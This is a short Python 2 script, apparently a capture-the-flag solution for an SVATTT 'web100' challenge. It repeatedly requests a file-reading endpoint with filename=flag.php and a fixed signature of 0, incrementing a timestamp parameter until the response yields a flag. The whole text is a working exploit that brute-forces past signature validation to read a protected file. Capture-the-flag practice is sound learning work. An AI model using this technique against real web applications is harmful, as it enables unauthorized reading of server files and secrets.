#!/usr/bin/python

import urllib2
import re

timestamp = 0
p = re.compile('SVATTT\{.*\}')

while 1:
    req = urllib2.Request('http://readfile.svattt.org:8888/web100.php?filename=flag.php&timestamp='+str(timestamp)+'&sig=0')
    response = urllib2.urlopen(req)
    html = response.read()
    m = p.findall(html)
    if m:
        print 'Flag is: ' +  m[0]
        break
    else:
        timestamp = timestamp + 1

